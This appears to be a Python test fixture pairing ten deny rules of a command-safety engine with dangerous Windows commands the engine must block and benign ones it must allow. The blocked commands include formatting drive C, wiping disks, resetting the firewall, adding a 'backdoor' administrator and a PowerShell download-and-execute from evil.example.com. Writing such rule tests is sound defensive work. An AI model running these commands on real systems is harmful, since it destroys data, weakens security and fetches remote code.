"""Built-in deny rules + dangerous commands that should trigger each.

For each of the 10 built-in rules shipped under
``safety/builtin/*.json``, this module declares:

* ``rule_id``     — the canonical id (e.g. ``block-format-volume``)
* ``severity``    — expected severity tag (``critical`` / ``high`` / ``medium``)
* ``match_cmd``   — a command string the engine MUST match
* ``no_match_cmd``— a benign command the engine MUST NOT match

The engine test in :mod:`tests.e2e.test_05_policy_enforcement` calls
:func:`RuleEngine.match` directly for each entry and asserts the
match contract holds. The HTTP test in the same file then proves the
running server has all rules loaded (via ``/api/rules``) and that
toggle / reload / disabled round-trips work.
"""

from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class RuleCase:
    rule_id: str
    severity: str
    match_cmd: str
    no_match_cmd: str


RULE_CASES: tuple[RuleCase, ...] = (
    RuleCase(
        rule_id="block-format-volume",
        severity="critical",
        match_cmd="Format-Volume -DriveLetter C",
        no_match_cmd="Get-Volume -DriveLetter C",
    ),
    RuleCase(
        rule_id="block-disk-wipe",
        severity="critical",
        match_cmd="cipher /w:C:\\secret",
        no_match_cmd="cipher /e:C:\\secret",
    ),
    RuleCase(
        rule_id="block-firewall-reset",
        severity="high",
        match_cmd="netsh advfirewall reset",
        no_match_cmd="netsh advfirewall show allprofiles",
    ),
    RuleCase(
        rule_id="block-boot-loader",
        severity="critical",
        match_cmd="bcdedit /set {default} bootstatuspolicy ignoreallfailures",
        no_match_cmd="Get-Process | Where-Object {$_.Name -like 'bcd*'}",
    ),
    RuleCase(
        rule_id="block-kill-protected",
        severity="critical",
        match_cmd="taskkill /F /IM csrss.exe",
        no_match_cmd="taskkill /F /IM notepad.exe",
    ),
    RuleCase(
        rule_id="block-privilege-escalation",
        severity="high",
        match_cmd="net localgroup administrators backdoor /add",
        no_match_cmd="net localgroup",
    ),
    RuleCase(
        rule_id="block-rdp-enable",
        severity="medium",
        match_cmd="Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -Name fDenyTSConnections -Value 0",
        no_match_cmd="Get-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server'",
    ),
    RuleCase(
        rule_id="block-registry-delete",
        severity="high",
        match_cmd='Remove-Item HKLM:\\Software\\SomeKey',
        no_match_cmd="Get-ChildItem HKLM:\\Software",
    ),
    RuleCase(
        rule_id="block-remote-download-exec",
        severity="high",
        match_cmd="IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/x.ps1')",
        no_match_cmd="Invoke-Expression 'Get-Date'",
    ),
    RuleCase(
        rule_id="block-system-rm",
        severity="critical",
        match_cmd="Remove-Item C:\\Windows\\System32\\important.dll",
        no_match_cmd="Remove-Item C:\\Users\\me\\old.log",
    ),
)